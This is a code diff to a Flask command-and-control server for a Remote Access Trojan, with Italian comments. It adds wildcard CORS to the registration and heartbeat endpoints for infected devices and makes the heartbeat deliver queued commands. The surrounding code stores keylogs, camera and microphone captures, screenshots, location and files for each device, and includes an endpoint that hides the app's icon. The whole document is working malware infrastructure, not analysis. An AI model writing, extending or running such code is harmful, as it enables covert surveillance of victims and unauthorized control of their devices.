@@ -19,6 +19,14 @@ app.config['BASE_SCREENSHOT_FOLDER'] = os.path.join(os.path.dirname(os.path.absp
 app.config['BASE_FILE_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/files')
 app.config['BASE_CAMERA_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/camera')
 
+# Abilita CORS per consentire connessioni da qualsiasi origine
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    return response
+
 # Ensure all folders exist
 os.makedirs(app.config['BASE_UPLOAD_FOLDER'], exist_ok=True)
 os.makedirs(app.config['BASE_SCREENSHOT_FOLDER'], exist_ok=True)
@@ -193,18 +201,33 @@ CURRENT_FLASK_PORT = FLASK_WEB_PORT
 active_rat_connections = {}  # device_id -> socket connection
 
 # Socket connection endpoint for RAT devices
-@app.route("/api/rat_connect", methods=["POST"])
+@app.route("/api/rat_connect", methods=["POST", "OPTIONS"])
 def rat_connect():
     """Handle RAT device socket-style connections via HTTP"""
-    data = request.json
-    device_id = data.get('device_id')
-    device_type = data.get('device_type', 'unknown')
-    connection_type = data.get('connection_type', 'register')
-    
-    print(f"[RAT] Connection from {request.remote_addr} - Device: {device_id}, Type: {connection_type}")
-    
-    if not device_id:
-        return jsonify({"error": "Missing device_id"}), 400
+    # Gestisci le richieste OPTIONS per CORS
+    if request.method == "OPTIONS":
+        return jsonify({"status": "ok"}), 200
+        
+    # Gestisci le richieste POST normali
+    try:
+        data = request.json
+        if not data:
+            # Se non ci sono dati JSON, prova a leggere i dati form
+            data = request.form.to_dict()
+            
+        device_id = data.get('device_id')
+        device_type = data.get('device_type', 'unknown')
+        connection_type = data.get('connection_type', 'register')
+
+        print(f"[RAT] Connection from {request.remote_addr} - Device: {device_id}, Type: {connection_type}")
+        append_flask_log("SERVER_EVENTS", f"Tentativo di connessione da {request.remote_addr} - Device: {device_id}, Type: {connection_type}")
+
+        if not device_id:
+            return jsonify({"error": "Missing device_id"}), 400
+    except Exception as e:
+        print(f"[ERROR] Exception in rat_connect: {str(e)}")
+        append_flask_log("SERVER_EVENTS", f"Errore nella connessione: {str(e)}")
+        return jsonify({"error": str(e), "status": "error"}), 500
     
     with data_lock:
         if device_id not in devices_data:
@@ -1032,20 +1055,48 @@ def inject_config():
     append_flask_log(username, f"Config command '{config_command}' added to queue for device '{target_device_id}'.")
     return jsonify({"status":"ok", "message": f"Config command queued for device '{target_device_id}'."})
 
-@app.route("/api/heartbeat/<device_id>", methods=["POST"])
+@app.route("/api/heartbeat/<device_id>", methods=["POST", "OPTIONS"])
 def api_heartbeat_client(device_id):
-    data = request.json
-    device_type = data.get("device_type", "unknown")
-    rat_version = data.get("rat_version", "unknown")
-    with data_lock:
-        if device_id not in devices_data:
-            devices_data[device_id] = {'location':{}, 'logs':[], 'screenshots':[], 'commands':[], 'files':[], 'camera':[], 'mic':[], 'keylog':[], 'device_type': device_type, 'last_seen': int(time.time()), 'rat_version': rat_version}
-            append_flask_log("SERVER_EVENTS", f"New device discovered via heartbeat: {device_id} (Type: {device_type}, RAT v{rat_version})")
-        else:
-            devices_data[device_id]['last_seen'] = int(time.time())
-            devices_data[device_id]['device_type'] = device_type
-            devices_data[device_id]['rat_version'] = rat_version
-    return jsonify({"status":"received", "device_id": device_id})
+    # Gestisci le richieste OPTIONS per CORS
+    if request.method == "OPTIONS":
+        return jsonify({"status": "ok"}), 200
+        
+    try:
+        data = request.json
+        if not data:
+            # Se non ci sono dati JSON, prova a leggere i dati form
+            data = request.form.to_dict()
+            
+        device_type = data.get("device_type", "unknown")
+        rat_version = data.get("rat_version", "unknown")
+        
+        print(f"[RAT] Heartbeat from {request.remote_addr} - Device: {device_id}, Type: {device_type}")
+        
+        with data_lock:
+            if device_id not in devices_data:
+                devices_data[device_id] = {'location':{}, 'logs':[], 'screenshots':[], 'commands':[], 'files':[], 'camera':[], 'mic':[], 'keylog':[], 'device_type': device_type, 'last_seen': int(time.time()), 'rat_version': rat_version}
+                append_flask_log("SERVER_EVENTS", f"Nuovo dispositivo scoperto via heartbeat: {device_id} (Type: {device_type}, RAT v{rat_version})")
+            else:
+                devices_data[device_id]['last_seen'] = int(time.time())
+                devices_data[device_id]['device_type'] = device_type
+                devices_data[device_id]['rat_version'] = rat_version
+                append_flask_log("SERVER_EVENTS", f"Heartbeat ricevuto da: {device_id}")
+                
+        # Invia eventuali comandi in attesa
+        pending_commands = []
+        with data_lock:
+            if device_id in devices_data and 'commands' in devices_data[device_id]:
+                pending_commands = devices_data[device_id].get('commands', [])
+                
+        return jsonify({
+            "status": "received", 
+            "device_id": device_id,
+            "commands": pending_commands
+        })
+    except Exception as e:
+        print(f"[ERROR] Exception in heartbeat: {str(e)}")
+        append_flask_log("SERVER_EVENTS", f"Errore nell'heartbeat: {str(e)}")
+        return jsonify({"error": str(e), "status": "error"}), 500
 
 @app.route("/api/hide_icon/<device_id>", methods=["POST"])
 def api_hide_icon_client(device_id):
